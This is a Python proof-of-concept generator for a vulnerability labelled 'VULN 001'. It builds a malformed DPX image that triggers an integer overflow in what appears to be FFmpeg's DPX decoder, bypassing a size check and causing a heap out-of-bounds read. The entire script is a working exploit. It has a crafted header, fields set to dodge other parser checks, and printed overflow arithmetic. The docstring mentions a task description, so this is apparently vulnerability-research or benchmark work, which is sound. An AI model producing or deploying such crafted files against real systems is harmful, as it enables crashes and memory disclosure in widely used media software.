#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer overflow in DPX size check bypasses bounds guard.

Trigger path:
  decode_frame() -> line 629: need_align = FFALIGN(stride, 4)
  line 630: need_align * avctx->height (int*int) overflows when width=2048, height=131072, 16-bit RGBA
  Result: negative int64 value causes size check to be FALSE -> bypassed
  -> unpack_frame() reads 2GB from a 4KB packet buffer -> heap OOB read

Note: The task description mentions bits_per_raw_sample=32, but line 369 in dpx.c blocks
bits>=32 with AVERROR_INVALIDDATA. We use bits=16 with height=131072 instead, which
produces the same integer overflow:
  stride = 2 * 2048 * 4 = 16384
  need_align = FFALIGN(16384, 4) = 16384
  16384 * 131072 = 2^31 -> overflows int32 to INT_MIN = -2147483648
  -2147483648 + (int64_t)offset = negative -> less than avpkt->size -> check bypassed
"""
import struct
import os

def gen():
    IMAGE_DATA_OFFSET = 2048
    FILE_SIZE = 4096
    WIDTH = 2048
    HEIGHT = 131072   # 2^17; stride(16384) * 131072 = 2^31 -> int overflow
    DESCRIPTOR = 51   # RGBA (4 components)
    BIT_SIZE = 16     # 16-bit -> pix_fmt RGBA64BE (case 51161 in switch)
    # stride = 2 * 2048 * 4 = 16384; FFALIGN(16384,4) = 16384
    # 16384 * 131072 = 2147483648 -> signed int32 overflow -> -2147483648
    # check: -2147483648 + 2048 = -2147481600 > 4096 -> FALSE -> bypassed!

    header = bytearray(IMAGE_DATA_OFFSET)

    # --- File information header (768 bytes) ---
    # Magic "SDPX" big-endian -> dpx->endian = 1 (big-endian)
    struct.pack_into('>I', header, 0, 0x53445058)

    # Image data offset (big-endian)
    struct.pack_into('>I', header, 4, IMAGE_DATA_OFFSET)

    # Header version: read with read32(&buf, 0) -> little-endian
    # MKTAG('V','2','.','0') = bytes V,2,.,0 in little-endian order
    header[8:12] = b'V2.0'
    header[12:16] = b'\x00\x00\x00\x00'

    # File size (big-endian)
    struct.pack_into('>I', header, 16, FILE_SIZE)

    # Ditto version (unused)
    struct.pack_into('>I', header, 20, 0)

    # Creator (bytes 24-123) - zeros, not "Scanity" or "Lasergraphics" -> unpadded_10bit=0
    # Project (bytes 124-323) - zeros
    # Copyright (bytes 324-523) - zeros

    # Encryption key at byte 524 (spec says 524, code reads from 660)
    # Code reads from offset 660: set 0xFFFFFFFF to avoid "Encryption" warning
    struct.pack_into('>I', header, 660 - 0 if 660 < IMAGE_DATA_OFFSET else 0,
                     0xFFFFFFFF if 660 < IMAGE_DATA_OFFSET else 0)

    # --- Image information header (starting at offset 768) ---
    struct.pack_into('>H', header, 768, 0)       # image orientation
    struct.pack_into('>H', header, 770, 1)       # number of image elements = 1
    struct.pack_into('>I', header, 772, WIDTH)   # pixels per line (width)
    struct.pack_into('>I', header, 776, HEIGHT)  # lines per element (height)

    # --- Image element 0 (starting at offset 780) ---
    struct.pack_into('>I', header, 780, 0)           # data sign: unsigned
    struct.pack_into('>I', header, 784, 0)           # low data
    struct.pack_into('>f', header, 788, 0.0)         # low quantity
    struct.pack_into('>I', header, 792, 0xFFFFFFFF)  # high data
    struct.pack_into('>f', header, 796, 1.0)         # high quantity
    header[800] = DESCRIPTOR                          # descriptor = 51 (RGBA)
    header[801] = 0                                   # transfer characteristic
    header[802] = 0                                   # colorimetric
    header[803] = BIT_SIZE                            # bit size = 16
    struct.pack_into('>H', header, 804, 0)           # packing = 0 (filled)
    struct.pack_into('>H', header, 806, 0)           # encoding = 0 (none)
    struct.pack_into('>I', header, 808, IMAGE_DATA_OFFSET)  # element data offset
    struct.pack_into('>I', header, 812, 0)           # end of line padding
    struct.pack_into('>I', header, 816, 0)           # end of image padding

    # Bytes 1628-1635 (sample_aspect_ratio): zeros -> {0,0} -> set to {0,1}, fine
    # Bytes 1724-1727 (frame rate from motion-picture film header):
    #   set 0xFFFFFFFF -> read32 = 0xFFFFFFFF -> `if(i && i != 0xFFFFFFFF)` = false -> skip
    #   This also sets variable `i` = 0xFFFFFFFF going into the TC block.
    # Bytes 1940-1943 (alternate frame rate from TV header):
    #   set 0xFFFFFFFF -> same skip logic; sets i = 0xFFFFFFFF
    #   Then TC block at 1920: `if (i != 0xFFFFFFFF)` = false -> skip TC (avoids framerate={0,0} crash)
    # Bytes 1952-1955 (color range min): 0xFFFFFFFF -> skips color range parsing
    # All these bytes are >= IMAGE_DATA_OFFSET (2048) so they're in the pixel_data region below.

    # Pixel data area: FILE_SIZE - IMAGE_DATA_OFFSET = 2048 bytes of zeros
    # We need specific bytes beyond offset 2048:
    pixel_data = bytearray(FILE_SIZE - IMAGE_DATA_OFFSET)

    # Offsets relative to start of pixel_data (absolute_offset - IMAGE_DATA_OFFSET):
    # bytes 1724-1727 -> pixel_data[1724-2048] = negative -> in header region, already handled
    # Actually 1724 < 2048, so bytes 1724 are in header region:

    # Re-check which bytes are in header vs pixel_data:
    # header = bytes 0..2047
    # pixel_data = bytes 2048..4095

    # Bytes in header region that need setting:
    # 660-663: 0xFFFFFFFF (encryption)
    if 660 < IMAGE_DATA_OFFSET:
        struct.pack_into('>I', header, 660, 0xFFFFFFFF)

    # 1724-1727: frame rate -> 0xFFFFFFFF
    if 1724 < IMAGE_DATA_OFFSET:
        struct.pack_into('>I', header, 1724, 0xFFFFFFFF)

    # 1940-1943: alt frame rate -> 0xFFFFFFFF
    if 1940 < IMAGE_DATA_OFFSET:
        struct.pack_into('>I', header, 1940, 0xFFFFFFFF)

    # 1952-1955: color range -> 0xFFFFFFFF
    if 1952 < IMAGE_DATA_OFFSET:
        struct.pack_into('>I', header, 1952, 0xFFFFFFFF)

    # Bytes in pixel_data region:
    for abs_offset, value in [
        (1724, 0xFFFFFFFF),  # frame rate
        (1940, 0xFFFFFFFF),  # alt frame rate
        (1952, 0xFFFFFFFF),  # color range
    ]:
        if abs_offset >= IMAGE_DATA_OFFSET:
            rel = abs_offset - IMAGE_DATA_OFFSET
            if rel + 4 <= len(pixel_data):
                struct.pack_into('>I', pixel_data, rel, value)

    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.dpx')
    with open(out_path, 'wb') as f:
        f.write(bytes(header))
        f.write(bytes(pixel_data))

    print(f"[+] Written {FILE_SIZE} bytes to {out_path}")
    print(f"[+] width={WIDTH}, height={HEIGHT}, descriptor={DESCRIPTOR}, bits={BIT_SIZE}")
    print(f"[+] stride = 2 * {WIDTH} * 4 = {2*WIDTH*4}")
    stride = 2 * WIDTH * 4
    product = stride * HEIGHT  # this overflows in C int32
    import ctypes
    product_int32 = ctypes.c_int32(stride * HEIGHT).value
    print(f"[+] stride({stride}) * height({HEIGHT}) = {stride*HEIGHT} -> int32 overflow -> {product_int32}")
    print(f"[+] check: {product_int32} + {IMAGE_DATA_OFFSET} = {product_int32 + IMAGE_DATA_OFFSET} > {FILE_SIZE} -> {product_int32 + IMAGE_DATA_OFFSET > FILE_SIZE} (should be False -> bypassed)")

if __name__ == '__main__':
    gen()
